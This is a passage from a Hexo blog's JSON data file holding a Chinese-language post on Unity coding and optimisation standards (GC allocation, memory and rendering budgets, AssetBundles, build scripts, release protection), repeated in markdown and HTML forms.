as Texture;</code></pre><ul>\n<li>9:查看所有内置资源</li>\n</ul>\n<pre><code>        [MenuItem(&quot;Tools/Test1&quot;)]\n        static void GetBultinAssetNames()\n        {\n            var flags = BindingFlags.Static | BindingFlags.NonPublic;\n            var info = typeof(EditorGUIUtility).GetMethod(&quot;GetEditorAssetBundle&quot;, flags);\n            var bundle = info.Invoke(null, new object[0]) as AssetBundle;\n\n            foreach (var n in bundle.GetAllAssetNames())\n            {\n                Debug.Log(n);\n            }\n        }</code></pre><hr>\n"},{"title":"Unity 代码编写规范","date":"2020-05-08T03:41:32.000Z","top":4,"_content":"\n#优化标准\n诚然每个游戏的标准不同,但是大体上面是有一个测试标准的.\n这个标准应该称之为行业内标准,我们可以根据这个标准作出在合理范围内上下浮动就证明这个游戏是比较差,中,好.\n\n##代码优化标准:\n* 1 尽量避免使用Lambda表达式：存在内存泄露隐患。\n* 2 尽量避免使用LINQ：部分功能无法在某些平台上使用，且会分配大量GC Alloc。\n* 3 控制StartCorountine()的次数：开启一个协程，至少分配37B的内存（Coroutine类的实例 - 21B；Enumerator - 16B）。建议:少用/不用协程,创建一个总协程,全局只使用一个协程等.\n* 4 使用StringBuilder来代替String进行字符串拼接：StringBuilder.Append方法在拼接字符串时，变化总是发生在同一个内存块中；而String + String + ...这种字符串拼接方式，会频繁申请内存并释放，导致GC频繁调用。\n* 5 缓存组件：每次GetComponent均会分配一定的GC Alloc；每次获取对象名称Object.name（实际为Object.get_name()）会分配39B（具体大小视实际情况而定）的堆内存。建议:提前获取,不要在循环体中获取,最好不要使用Object.name等.\n* 6 避免使用开销大的函数：如GameObject.Find、GameObject.FindWithTag、Object.FindObjectOfType等查询方法。\n* 7 使用GameObject.CompareTag代替GameObject.tag：GameObject.tag会在内部循环调用对象分配的标签属性并分配额外的内存。\n* 8 使用ObjectPool对象池来管理对象：避免频繁的Instance和Destroy，这两个操作都挺耗性能的。\n* 9 延时操作总能降低峰值.尽量不要在Update()函数中做复杂计算：如若需要，可以隔N帧计算一次。\n* 10 递归绝不推荐,尽量减少函数调用栈：如用x = (x > 0 ? x : -x)代替x = Mathf.Abs(x)。减少 while(true){}里面循环一直调用的方式,除非在非常重要的功能上面,比如战斗.\n## 纹理优化\n  ● 纹理压缩格式：iOS使用PVRTC格式；Android使用ETC格式；Windows使用DXT格式。\n\n       ● 凡是3D场景，都应该尽可能启用MipMaps。如果硬件MipMaps无法满足效果要求：1、使用自己生成的Mipmaps；2、使用Aniso。\n\n       ● 如果纹理用于UI或2D场景，禁用MipMaps。\n\n       ● 通过减色的方式降低纹理大小。\n##内存优化\n ● 建议总内存控制在150MB以下；堆内存控制在40MB以下。\n\n       ● 切换场景时避开内存峰值。当前一个场景还未释放就切换到新场景，这时由于两个场景的内存叠加容易造成内存峰值。可以采用在屏幕中间遮盖一个Loading场景，在旧场景释放完成，并且新场景初始化结束后，再隐藏Loading场景。\n\n       ●​ 使用Prefabs（凡是场景物体，都应该制作成Prefabs）。\n\n       ● 通过ObjectPool对象池来避免内存的频繁操作，从而避免内存碎片影响到大内存块的申请；尝试在切换场景时不释放公共UI资源。\n\n       ●​ 通过LoadManager，保证在同一时间段内仅载入一个WWW对象，实现顺序加载。\n\n       ●​ 纹理内存占用过大：峰值 < 50MB。\n\n       ●​ 内存泄露：内存需保持升降一致，避免泄露。\n\n       ●​ 网格资源内存过大：峰值 < 20MB。\n\n       ●​ 动画片段：内存 < 15MB，警惕资源泄露。\n\n       ●​ 音频资源：内存 < 15MB，警惕资源泄露。​\n## 渲染优化\n       ●​ DrawCall数量：峰值 < 250，主体范围（5% - 95%）应在（0 - 200）个之内。\n\n       ● Triangle数量：峰值 < 100000/帧。\n\n       ● VBO上传量：峰值 < 5MB，频繁加载的资源使用缓存池缓存。\n\n       ●​ Skinned Mesh数量：峰值 < 50，对应Profiler中的MeshSdinning.Update、Animator.Update。\n\n​       ● RenderTexture：数量 < 10。\n## CPU优化​\n      ●​ Rigidbody数量：峰值 < 50/帧，对应Profiler中的Physics.Simulate。\n\n       ● 碰撞体数量：峰值 < 100/帧，对应Profiler中的Physics.Simulate。\n## 合理使用AssetBundles\n● 采用依赖性打包\n\n    ●​ Assetdatabase.GetDependencies\n\n    ●​ Push / Pop\n\n● WWW vs. CreateFromFile\n\n    ● WWW常被用于加载采用Unity标准压缩方法压缩过的AssetBundles。\n\n    ●​  CreateFromFile只能加载非压缩格式的本地AssetBundles；可以先采用其他压缩格式进行压缩，下载到本地后自行解压，再行加载和使用。\n\n● AssetBundle.mainAsset的功能往往被忽视\n\n    ● 它可以是标准的资源asset，用来存储AssetBundles中最重要的资源文件。\n\n    ●  也可以是TextAsset，其中可以包含任意内容，推荐用来记录每个AssetBundle中的物体列表和信息描述。\n## Build AssetBundles\n● 问题：当修改AssetBundles中的内容时，需要重新Build这些AssetBundles才能使其生效。这个过程往往非常耗时并影响开发效率。\n\n● 开发阶段和发布阶段使用不同的策略：\n\n    ●​ 为了提高在Unity Editor中反复修改AssetBundles的调试效率，推荐开发时使用Resources.LoadAssetAtPath来避免重新建立AssetBundles。\n\n    ●​ 在发布时才使用唯一的脚本打包AssetBundles。\n## AssetDatabase.ImportAsset\n● AssetDatabase.ImportAsset有三个重要事实：\n\n    ●​ 它是将一个外部asset转化为Unity内部能够识别的internal asset，但并不实际在内存中加载asset，更没有返回值。\n\n    ● 它会根据AssetImporter中的相关设定对asset的相关属性进行修改，尽管两个API之间没有任何的参数传递。\n\n    ● 它常常被用于在调用BuildPipeline.BuildAssetBundle前强行重新导入一个asset。\n\n    ●​ 几种常用的AssetImporter类型：TextureImporter、ModelImporter及MovieImporter。\n## 预处理和后处理函数\n● AssetPostprocessor的作用\n\n    ●​ AssetPostprocessor可以在import每个asset之前和之后分别自动触发AssetPostprocessor.OnPreprocessXXX和AssetPostprocessor.OnPostprocessXXX。\n\n    ●​ 方便用户介入和修改资源导入的过程。\n## Build Player\n●  自动编译Player\n\n    ●​ 支持命令行进行编译。\n\n    ● 编写编译脚本，并放在Assets/Editor目录下。\n\n    ●​ 脚本中声明一个类，包含一个静态方法，通过BuildPipeline.BuildPlayer来实现编译工作。\n\n● 编译后处理脚本\n\n    ●​ Unity支持在编译好可执行程序之后，通过后处理脚本对其进行一定的修改，例如制作安装文件等。\n\n        ●​ 在Windows平台下，可以在编辑器脚本（Editor Script）中使用BuildPipeline.BuildPlayer方法来进行编译，并在其后添加任意的后处理代码。\n\n        ●​ 在Mac平台下，Unity在编译工程后会自动查找一个名为PostprocessBuildPlayer的后处理脚本文件，用于实现编译后处理；后处理脚本可以是sh、perl或任意与命令行兼容的语言。\n## 项目发布策略\n●  对移动芯片的支持\n\n    ● 从Unity 4.0开始，Unity停止了对ARM V6架构的支持。\n\n    ●​ Unity 3.5.x版本仍旧支持ARM V6架构。\n\n● Graphics Emulation\n\n    ●​ 在不使用实际硬件设备的前提下，在Unity编辑器中就可以模拟测试不同图形硬件对当前项目中所使用的图形API的支持能力（对Editor->Graphics Emulation进行设置）。\n\n●​ 发布包的代码保护\n\n    ●​ Unity脚本在iOS平台下是安全的，与是否使用AssetBundle无关。\n\n    ●​ 对于Android和其他平台，可以采用AssetBundle + TextAsset的方式进行，也可以采用代码混淆的方式进行。\n\n    ●​ 在所有平台下都可以使用Native DLL。\n\n● 发布包的代码加密\n\n    ● 需通过AssetBundle和TextAsset来实现，即把代码编译为TextAsset，并打包入AssetBundle中，参考官方文档：“Including scripts in AssetBundles”一节：[http://docs.unity3d.com/Documentation/Manual/scriptsinassetbundles.html](http://docs.unity3d.com/Documentation/Manual/scriptsinassetbundles.html)\n\n    ● 其中TextAsset并不是真正意义上的Text，而是编译好的dll文件，是以binary形式存在的。参考官方文档“Text Asset”中的“Binary data”一节：[http://docs.unity3d.com/Documentation/Components/class-TextAsset.html](http://docs.unity3d.com/Documentation/Components/class-TextAsset.html)\n\n● 发布包的美术资源加密\n\n    ●​ 对于所有平台，最常见的是对贴图进行加密，通过AssetBundle和TextAsset来实现。\n\n● 程序发布后的增量更新\n\n    ●​ 原理：Unity脚本经过编译后就不能再修改，但是可以添加。\n\n    ●​ 方案1：将脚本与资源全部分离。\n\n        ●​ 项目管理非常麻烦。\n\n        ●​ 动态挂载所有脚本。\n\n        ●​ 无法在编辑器中使用动态编辑。\n\n    ● 方案2：将接口与实现分离。\n\n        ●​ 不改变用户工作流程。\n\n        ●​ 仍可在编辑器重使用动态编辑。\n\n        ●​ 对代码起到一定的保护作用（可以混淆）。\n\n        ●​ 对原有的AssetBundles打包方案没有任何影响。\n\nFPS 帧率\n高端机 60 帧左右\n低端机/中端机统一 30 帧(包含)以上\n低端机以红米 note4 为准,CPU 型号是 Helio X20\n低于 24 帧必定要做优化\n\n#UWA内存优化\nUWA有 4 种测试模式\n* 模式 1 Overview\n*模式 2 Mono 由于目前项目大部分采用 il2cpp,所以这个模式会被逐渐放弃.但是即使你采用了il2cpp 模式也有必要去使用 mono 模式打包,并去测试,不要嫌麻烦.\n*模式 3 Assets 资源检测,检测资源重复,是否耗费运行资源过大.\n*模式 4 Lua  检查 Lua,收费模式\n\n\n\n#UPR内存优化","source":"_posts/Unity/Optimize/代码编写规范.md","raw":"---\ntitle: Unity 代码编写规范\ndate: 2020-05-08 11:41:32\ntop: 4\ncategories:\n- Unity优化\ntags:\n- Unity优化\n---\n\n#优化标准\n诚然每个游戏的标准不同,但是大体上面是有一个测试标准的.\n这个标准应该称之为行业内标准,我们可以根据这个标准作出在合理范围内上下浮动就证明这个游戏是比较差,中,好.\n\n##代码优化标准:\n* 1 尽量避免使用Lambda表达式：存在内存泄露隐患。\n* 2 尽量避免使用LINQ：部分功能无法在某些平台上使用，且会分配大量GC Alloc。\n* 3 控制StartCorountine()的次数：开启一个协程，至少分配37B的内存（Coroutine类的实例 - 21B；Enumerator - 16B）。建议:少用/不用协程,创建一个总协程,全局只使用一个协程等.\n* 4 使用StringBuilder来代替String进行字符串拼接：StringBuilder.Append方法在拼接字符串时，变化总是发生在同一个内存块中；而String + String + ...这种字符串拼接方式，会频繁申请内存并释放，导致GC频繁调用。\n* 5 缓存组件：每次GetComponent均会分配一定的GC Alloc；每次获取对象名称Object.name（实际为Object.get_name()）会分配39B（具体大小视实际情况而定）的堆内存。建议:提前获取,不要在循环体中获取,最好不要使用Object.name等.\n* 6 避免使用开销大的函数：如GameObject.Find、GameObject.FindWithTag、Object.FindObjectOfType等查询方法。\n* 7 使用GameObject.CompareTag代替GameObject.tag：GameObject.tag会在内部循环调用对象分配的标签属性并分配额外的内存。\n* 8 使用ObjectPool对象池来管理对象：避免频繁的Instance和Destroy，这两个操作都挺耗性能的。\n* 9 延时操作总能降低峰值.尽量不要在Update()函数中做复杂计算：如若需要，可以隔N帧计算一次。\n* 10 递归绝不推荐,尽量减少函数调用栈：如用x = (x > 0 ? x : -x)代替x = Mathf.Abs(x)。减少 while(true){}里面循环一直调用的方式,除非在非常重要的功能上面,比如战斗.\n## 纹理优化\n  ● 纹理压缩格式：iOS使用PVRTC格式；Android使用ETC格式；Windows使用DXT格式。\n\n       ● 凡是3D场景，都应该尽可能启用MipMaps。如果硬件MipMaps无法满足效果要求：1、使用自己生成的Mipmaps；2、使用Aniso。\n\n       ● 如果纹理用于UI或2D场景，禁用MipMaps。\n\n       ● 通过减色的方式降低纹理大小。\n##内存优化\n ● 建议总内存控制在150MB以下；堆内存控制在40MB以下。\n\n       ● 切换场景时避开内存峰值。当前一个场景还未释放就切换到新场景，这时由于两个场景的内存叠加容易造成内存峰值。可以采用在屏幕中间遮盖一个Loading场景，在旧场景释放完成，并且新场景初始化结束后，再隐藏Loading场景。\n\n       ●​ 使用Prefabs（凡是场景物体，都应该制作成Prefabs）。\n\n       ● 通过ObjectPool对象池来避免内存的频繁操作，从而避免内存碎片影响到大内存块的申请；尝试在切换场景时不释放公共UI资源。\n\n       ●​ 通过LoadManager，保证在同一时间段内仅载入一个WWW对象，实现顺序加载。\n\n       ●​ 纹理内存占用过大：峰值 < 50MB。\n\n       ●​ 内存泄露：内存需保持升降一致，避免泄露。\n\n       ●​ 网格资源内存过大：峰值 < 20MB。\n\n       ●​ 动画片段：内存 < 15MB，警惕资源泄露。\n\n       ●​ 音频资源：内存 < 15MB，警惕资源泄露。​\n## 渲染优化\n       ●​ DrawCall数量：峰值 < 250，主体范围（5% - 95%）应在（0 - 200）个之内。\n\n       ● Triangle数量：峰值 < 100000/帧。\n\n       ● VBO上传量：峰值 < 5MB，频繁加载的资源使用缓存池缓存。\n\n       ●​ Skinned Mesh数量：峰值 < 50，对应Profiler中的MeshSdinning.Update、Animator.Update。\n\n​       ● RenderTexture：数量 < 10。\n## CPU优化​\n      ●​ Rigidbody数量：峰值 < 50/帧，对应Profiler中的Physics.Simulate。\n\n       ● 碰撞体数量：峰值 < 100/帧，对应Profiler中的Physics.Simulate。\n## 合理使用AssetBundles\n● 采用依赖性打包\n\n    ●​ Assetdatabase.GetDependencies\n\n    ●​ Push / Pop\n\n● WWW vs. CreateFromFile\n\n    ● WWW常被用于加载采用Unity标准压缩方法压缩过的AssetBundles。\n\n    ●​  CreateFromFile只能加载非压缩格式的本地AssetBundles；可以先采用其他压缩格式进行压缩，下载到本地后自行解压，再行加载和使用。\n\n● AssetBundle.mainAsset的功能往往被忽视\n\n    ● 它可以是标准的资源asset，用来存储AssetBundles中最重要的资源文件。\n\n    ●  也可以是TextAsset，其中可以包含任意内容，推荐用来记录每个AssetBundle中的物体列表和信息描述。\n## Build AssetBundles\n● 问题：当修改AssetBundles中的内容时，需要重新Build这些AssetBundles才能使其生效。这个过程往往非常耗时并影响开发效率。\n\n● 开发阶段和发布阶段使用不同的策略：\n\n    ●​ 为了提高在Unity Editor中反复修改AssetBundles的调试效率，推荐开发时使用Resources.LoadAssetAtPath来避免重新建立AssetBundles。\n\n    ●​ 在发布时才使用唯一的脚本打包AssetBundles。\n## AssetDatabase.ImportAsset\n● AssetDatabase.ImportAsset有三个重要事实：\n\n    ●​ 它是将一个外部asset转化为Unity内部能够识别的internal asset，但并不实际在内存中加载asset，更没有返回值。\n\n    ● 它会根据AssetImporter中的相关设定对asset的相关属性进行修改，尽管两个API之间没有任何的参数传递。\n\n    ● 它常常被用于在调用BuildPipeline.BuildAssetBundle前强行重新导入一个asset。\n\n    ●​ 几种常用的AssetImporter类型：TextureImporter、ModelImporter及MovieImporter。\n## 预处理和后处理函数\n● AssetPostprocessor的作用\n\n    ●​ AssetPostprocessor可以在import每个asset之前和之后分别自动触发AssetPostprocessor.OnPreprocessXXX和AssetPostprocessor.OnPostprocessXXX。\n\n    ●​ 方便用户介入和修改资源导入的过程。\n## Build Player\n●  自动编译Player\n\n    ●​ 支持命令行进行编译。\n\n    ● 编写编译脚本，并放在Assets/Editor目录下。\n\n    ●​ 脚本中声明一个类，包含一个静态方法，通过BuildPipeline.BuildPlayer来实现编译工作。\n\n● 编译后处理脚本\n\n    ●​ Unity支持在编译好可执行程序之后，通过后处理脚本对其进行一定的修改，例如制作安装文件等。\n\n        ●​ 在Windows平台下，可以在编辑器脚本（Editor Script）中使用BuildPipeline.BuildPlayer方法来进行编译，并在其后添加任意的后处理代码。\n\n        ●​ 在Mac平台下，Unity在编译工程后会自动查找一个名为PostprocessBuildPlayer的后处理脚本文件，用于实现编译后处理；后处理脚本可以是sh、perl或任意与命令行兼容的语言。\n## 项目发布策略\n●  对移动芯片的支持\n\n    ● 从Unity 4.0开始，Unity停止了对ARM V6架构的支持。\n\n    ●​ Unity 3.5.x版本仍旧支持ARM V6架构。\n\n● Graphics Emulation\n\n    ●​ 在不使用实际硬件设备的前提下，在Unity编辑器中就可以模拟测试不同图形硬件对当前项目中所使用的图形API的支持能力（对Editor->Graphics Emulation进行设置）。\n\n●​ 发布包的代码保护\n\n    ●​ Unity脚本在iOS平台下是安全的，与是否使用AssetBundle无关。\n\n    ●​ 对于Android和其他平台，可以采用AssetBundle + TextAsset的方式进行，也可以采用代码混淆的方式进行。\n\n    ●​ 在所有平台下都可以使用Native DLL。\n\n● 发布包的代码加密\n\n    ● 需通过AssetBundle和TextAsset来实现，即把代码编译为TextAsset，并打包入AssetBundle中，参考官方文档：“Including scripts in AssetBundles”一节：[http://docs.unity3d.com/Documentation/Manual/scriptsinassetbundles.html](http://docs.unity3d.com/Documentation/Manual/scriptsinassetbundles.html)\n\n    ● 其中TextAsset并不是真正意义上的Text，而是编译好的dll文件，是以binary形式存在的。参考官方文档“Text Asset”中的“Binary data”一节：[http://docs.unity3d.com/Documentation/Components/class-TextAsset.html](http://docs.unity3d.com/Documentation/Components/class-TextAsset.html)\n\n● 发布包的美术资源加密\n\n    ●​ 对于所有平台，最常见的是对贴图进行加密，通过AssetBundle和TextAsset来实现。\n\n● 程序发布后的增量更新\n\n    ●​ 原理：Unity脚本经过编译后就不能再修改，但是可以添加。\n\n    ●​ 方案1：将脚本与资源全部分离。\n\n        ●​ 项目管理非常麻烦。\n\n        ●​ 动态挂载所有脚本。\n\n        ●​ 无法在编辑器中使用动态编辑。\n\n    ● 方案2：将接口与实现分离。\n\n        ●​ 不改变用户工作流程。\n\n        ●​ 仍可在编辑器重使用动态编辑。\n\n        ●​ 对代码起到一定的保护作用（可以混淆）。\n\n        ●​ 对原有的AssetBundles打包方案没有任何影响。\n\nFPS 帧率\n高端机 60 帧左右\n低端机/中端机统一 30 帧(包含)以上\n低端机以红米 note4 为准,CPU 型号是 Helio X20\n低于 24 帧必定要做优化\n\n#UWA内存优化\nUWA有 4 种测试模式\n* 模式 1 Overview\n*模式 2 Mono 由于目前项目大部分采用 il2cpp,所以这个模式会被逐渐放弃.但是即使你采用了il2cpp 模式也有必要去使用 mono 模式打包,并去测试,不要嫌麻烦.\n*模式 3 Assets 资源检测,检测资源重复,是否耗费运行资源过大.\n*模式 4 Lua  检查 Lua,收费模式\n\n\n\n#UPR内存优化","slug":"Unity/Optimize/代码编写规范","published":1,"updated":"2020-06-15T07:49:54.080Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d0k004m2gk7855i1tvy","content":"<p>#优化标准<br>诚然每个游戏的标准不同,但是大体上面是有一个测试标准的.<br>这个标准应该称之为行业内标准,我们可以根据这个标准作出在合理范围内上下浮动就证明这个游戏是比较差,中,好.</p>\n<p>##代码优化标准:</p>\n<ul>\n<li><p>1 尽量避免使用Lambda表达式：存在内存泄露隐患。</p>\n</li>\n<li><p>2 尽量避免使用LINQ：部分功能无法在某些平台上使用，且会分配大量GC Alloc。</p>\n</li>\n<li><p>3 控制StartCorountine()的次数：开启一个协程，至少分配37B的内存（Coroutine类的实例 - 21B；Enumerator - 16B）。建议:少用/不用协程,创建一个总协程,全局只使用一个协程等.</p>\n</li>\n<li><p>4 使用StringBuilder来代替String进行字符串拼接：StringBuilder.Append方法在拼接字符串时，变化总是发生在同一个内存块中；而String + String + …这种字符串拼接方式，会频繁申请内存并释放，导致GC频繁调用。</p>\n</li>\n<li><p>5 缓存组件：每次GetComponent均会分配一定的GC Alloc；每次获取对象名称Object.name（实际为Object.get_name()）会分配39B（具体大小视实际情况而定）的堆内存。建议:提前获取,不要在循环体中获取,最好不要使用Object.name等.</p>\n</li>\n<li><p>6 避免使用开销大的函数：如GameObject.Find、GameObject.FindWithTag、Object.FindObjectOfType等查询方法。</p>\n</li>\n<li><p>7 使用GameObject.CompareTag代替GameObject.tag：GameObject.tag会在内部循环调用对象分配的标签属性并分配额外的内存。</p>\n</li>\n<li><p>8 使用ObjectPool对象池来管理对象：避免频繁的Instance和Destroy，这两个操作都挺耗性能的。</p>\n</li>\n<li><p>9 延时操作总能降低峰值.尽量不要在Update()函数中做复杂计算：如若需要，可以隔N帧计算一次。</p>\n</li>\n<li><p>10 递归绝不推荐,尽量减少函数调用栈：如用x = (x &gt; 0 ? x : -x)代替x = Mathf.Abs(x)。减少 while(true){}里面循环一直调用的方式,除非在非常重要的功能上面,比如战斗.</p>\n<h2 id=\"纹理优化\"><a href=\"#纹理优化\" class=\"headerlink\" title=\"纹理优化\"></a>纹理优化</h2><p>● 纹理压缩格式：iOS使用PVRTC格式；Android使用ETC格式；Windows使用DXT格式。</p>\n<pre><code> ● 凡是3D场景，都应该尽可能启用MipMaps。如果硬件MipMaps无法满足效果要求：1、使用自己生成的Mipmaps；2、使用Aniso。\n\n ● 如果纹理用于UI或2D场景，禁用MipMaps。\n\n ● 通过减色的方式降低纹理大小。</code></pre><p>##内存优化<br>● 建议总内存控制在150MB以下；堆内存控制在40MB以下。</p>\n<pre><code> ● 切换场景时避开内存峰值。当前一个场景还未释放就切换到新场景，这时由于两个场景的内存叠加容易造成内存峰值。可以采用在屏幕中间遮盖一个Loading场景，在旧场景释放完成，并且新场景初始化结束后，再隐藏Loading场景。\n\n ●​ 使用Prefabs（凡是场景物体，都应该制作成Prefabs）。\n\n ● 通过ObjectPool对象池来避免内存的频繁操作，从而避免内存碎片影响到大内存块的申请；尝试在切换场景时不释放公共UI资源。\n\n ●​ 通过LoadManager，保证在同一时间段内仅载入一个WWW对象，实现顺序加载。\n\n ●​ 纹理内存占用过大：峰值 &lt; 50MB。\n\n ●​ 内存泄露：内存需保持升降一致，避免泄露。\n\n ●​ 网格资源内存过大：峰值 &lt; 20MB。\n\n ●​ 动画片段：内存 &lt; 15MB，警惕资源泄露。\n\n ●​ 音频资源：内存 &lt; 15MB，警惕资源泄露。​</code></pre><h2 id=\"渲染优化\"><a href=\"#渲染优化\" class=\"headerlink\" title=\"渲染优化\"></a>渲染优化</h2><pre><code> ●​ DrawCall数量：峰值 &lt; 250，主体范围（5% - 95%）应在（0 - 200）个之内。\n\n ● Triangle数量：峰值 &lt; 100000/帧。\n\n ● VBO上传量：峰值 &lt; 5MB，频繁加载的资源使用缓存池缓存。\n\n ●​ Skinned Mesh数量：峰值 &lt; 50，对应Profiler中的MeshSdinning.Update、Animator.Update。</code></pre></li>\n</ul>\n<p>​       ● RenderTexture：数量 &lt; 10。</p>\n<h2 id=\"CPU优化​\"><a href=\"#CPU优化​\" class=\"headerlink\" title=\"CPU优化​\"></a>CPU优化​</h2><pre><code>  ●​ Rigidbody数量：峰值 &lt; 50/帧，对应Profiler中的Physics.Simulate。\n\n   ● 碰撞体数量：峰值 &lt; 100/帧，对应Profiler中的Physics.Simulate。</code></pre><h2 id=\"合理使用AssetBundles\"><a href=\"#合理使用AssetBundles\" class=\"headerlink\" title=\"合理使用AssetBundles\"></a>合理使用AssetBundles</h2><p>● 采用依赖性打包</p>\n<pre><code>●​ Assetdatabase.GetDependencies\n\n●​ Push / Pop</code></pre><p>● WWW vs. CreateFromFile</p>\n<pre><code>● WWW常被用于加载采用Unity标准压缩方法压缩过的AssetBundles。\n\n●​  CreateFromFile只能加载非压缩格式的本地AssetBundles；可以先采用其他压缩格式进行压缩，下载到本地后自行解压，再行加载和使用。</code></pre><p>● AssetBundle.mainAsset的功能往往被忽视</p>\n<pre><code>● 它可以是标准的资源asset，用来存储AssetBundles中最重要的资源文件。\n\n●  也可以是TextAsset，其中可以包含任意内容，推荐用来记录每个AssetBundle中的物体列表和信息描述。</code></pre><h2 id=\"Build-AssetBundles\"><a href=\"#Build-AssetBundles\" class=\"headerlink\" title=\"Build AssetBundles\"></a>Build AssetBundles</h2><p>● 问题：当修改AssetBundles中的内容时，需要重新Build这些AssetBundles才能使其生效。这个过程往往非常耗时并影响开发效率。</p>\n<p>● 开发阶段和发布阶段使用不同的策略：</p>\n<pre><code>●​ 为了提高在Unity Editor中反复修改AssetBundles的调试效率，推荐开发时使用Resources.LoadAssetAtPath来避免重新建立AssetBundles。\n\n●​ 在发布时才使用唯一的脚本打包AssetBundles。</code></pre><h2 id=\"AssetDatabase-ImportAsset\"><a href=\"#AssetDatabase-ImportAsset\" class=\"headerlink\" title=\"AssetDatabase.ImportAsset\"></a>AssetDatabase.ImportAsset</h2><p>● AssetDatabase.ImportAsset有三个重要事实：</p>\n<pre><code>●​ 它是将一个外部asset转化为Unity内部能够识别的internal asset，但并不实际在内存中加载asset，更没有返回值。\n\n● 它会根据AssetImporter中的相关设定对asset的相关属性进行修改，尽管两个API之间没有任何的参数传递。\n\n● 它常常被用于在调用BuildPipeline.BuildAssetBundle前强行重新导入一个asset。\n\n●​ 几种常用的AssetImporter类型：TextureImporter、ModelImporter及MovieImporter。</code></pre><h2 id=\"预处理和后处理函数\"><a href=\"#预处理和后处理函数\" class=\"headerlink\" title=\"预处理和后处理函数\"></a>预处理和后处理函数</h2><p>● AssetPostprocessor的作用</p>\n<pre><code>●​ AssetPostprocessor可以在import每个asset之前和之后分别自动触发AssetPostprocessor.OnPreprocessXXX和AssetPostprocessor.OnPostprocessXXX。\n\n●​ 方便用户介入和修改资源导入的过程。</code></pre><h2 id=\"Build-Player\"><a href=\"#Build-Player\" class=\"headerlink\" title=\"Build Player\"></a>Build Player</h2><p>●  自动编译Player</p>\n<pre><code>●​ 支持命令行进行编译。\n\n● 编写编译脚本，并放在Assets/Editor目录下。\n\n●​ 脚本中声明一个类，包含一个静态方法，通过BuildPipeline.BuildPlayer来实现编译工作。</code></pre><p>● 编译后处理脚本</p>\n<pre><code>●​ Unity支持在编译好可执行程序之后，通过后处理脚本对其进行一定的修改，例如制作安装文件等。\n\n    ●​ 在Windows平台下，可以在编辑器脚本（Editor Script）中使用BuildPipeline.BuildPlayer方法来进行编译，并在其后添加任意的后处理代码。\n\n    ●​ 在Mac平台下，Unity在编译工程后会自动查找一个名为PostprocessBuildPlayer的后处理脚本文件，用于实现编译后处理；后处理脚本可以是sh、perl或任意与命令行兼容的语言。</code></pre><h2 id=\"项目发布策略\"><a href=\"#项目发布策略\" class=\"headerlink\" title=\"项目发布策略\"></a>项目发布策略</h2><p>●  对移动芯片的支持</p>\n<pre><code>● 从Unity 4.0开始，Unity停止了对ARM V6架构的支持。\n\n●​ Unity 3.5.x版本仍旧支持ARM V6架构。</code></pre><p>● Graphics Emulation</p>\n<pre><code>●​ 在不使用实际硬件设备的前提下，在Unity编辑器中就可以模拟测试不同图形硬件对当前项目中所使用的图形API的支持能力（对Editor-&gt;Graphics Emulation进行设置）。</code></pre><p>●​ 发布包的代码保护</p>\n<pre><code>●​ Unity脚本在iOS平台下是安全的，与是否使用AssetBundle无关。\n\n●​ 对于Android和其他平台，可以采用AssetBundle + TextAsset的方式进行，也可以采用代码混淆的方式进行。\n\n●​ 在所有平台下都可以使用Native DLL。</code></pre><p>● 发布包的代码加密</p>\n<pre><code>● 需通过AssetBundle和TextAsset来实现，即把代码编译为TextAsset，并打包入AssetBundle中，参考官方文档：“Including scripts in AssetBundles”一节：[http://docs.unity3d.com/Documentation/Manual/scriptsinassetbundles.html](http://docs.unity3d.com/Documentation/Manual/scriptsinassetbundles.html)\n\n● 其中TextAsset并不是真正意义上的Text，而是编译好的dll文件，是以binary形式存在的。参考官方文档“Text Asset”中的“Binary data”一节：[http://docs.unity3d.com/Documentation/Components/class-TextAsset.html](http://docs.unity3d.com/Documentation/Components/class-TextAsset.html)</code></pre><p>● 发布包的美术资源加密</p>\n<pre><code>●​ 对于所有平台，最常见的是对贴图进行加密，通过AssetBundle和TextAsset来实现。</code></pre><p>● 程序发布后的增量更新</p>\n<pre><code>●​ 原理：Unity脚本经过编译后就不能再修改，但是可以添加。\n\n●​ 方案1：将脚本与资源全部分离。\n\n    ●​ 项目管理非常麻烦。\n\n    ●​ 动态挂载所有脚本。\n\n    ●​ 无法在编辑器中使用动态编辑。\n\n● 方案2：将接口与实现分离。\n\n    ●​ 不改变用户工作流程。\n\n    ●​ 仍可在编辑器重使用动态编辑。\n\n    ●​ 对代码起到一定的保护作用（可以混淆）。\n\n    ●​ 对原有的AssetBundles打包方案没有任何影响。</code></pre><p>FPS 帧率<br>高端机 60 帧左右<br>低端机/中端机统一 30 帧(包含)以上<br>低端机以红米 note4 为准,CPU 型号是 Helio X20<br>低于 24 帧必定要做优化</p>\n<p>#UWA内存优化<br>UWA有 4 种测试模式</p>\n<ul>\n<li>模式 1 Overview</li>\n<li>模式 2 Mono 由于目前项目大部分采用 il2cpp,所以这个模式会被逐渐放弃.但是即使你采用了il2cpp 模式也有必要去使用 mono 模式打包,并去测试,不要嫌麻烦.</li>\n<li>模式 3 Assets 资源检测,检测资源重复,是否耗费运行资源过大.</li>\n<li>模式 4 Lua  检查 Lua,收费模式</li>\n</ul>\n<p>#UPR内存优化</p>\n","site":{"data":{}},"excerpt":"","more":"<p>#优化标准<br>诚然每个游戏的标准不同,但是大体上面是有一个测试标准的.<br>这个标准应该称之为行业内标准,我们可以根据这个标准作出在合理范围内上下浮动就证明这个游戏是比较差,中,好.</p>\n<p>##代码优化标准:</p>\n<ul>\n<li><p>1 尽量避免使用Lambda表达式：存在内存泄露隐患。</p>\n</li>\n<li><p>2 尽量避免使用LINQ：部分功能无法在某些平台上使用，且会分配大量GC Alloc。</p>\n</li>\n<li><p>3 控制StartCorountine()的次数：开启一个协程，至少分配37B的内存（Coroutine类的实例 - 21B；Enumerator - 16B）。建议:少用/不用协程,创建一个总协程,全局只使用一个协程等.</p>\n</li>\n<li><p>4 使用StringBuilder来代替String进行字符串拼接：StringBuilder.Append方法在拼接字符串时，变化总是发生在同一个内存块中；而String + String + …这种字符串拼接方式，会频繁申请内存并释放，导致GC频繁调用。</p>\n</li>\n<li><p>5 缓存组件：每次GetComponent均会分配一定的GC Alloc；每次获取对象名称Object.name（实际为Object.get_name()）会分配39B（具体大小视实际情况而定）的堆内存。建议:提前获取,不要在循环体中获取,最好不要使用Object.name等.</p>\n</li>\n<li><p>6 避免使用开销大的函数：如GameObject.Find、GameObject.FindWithTag、Object.FindObjectOfType等查询方法。</p>\n</li>\n<li><p>7 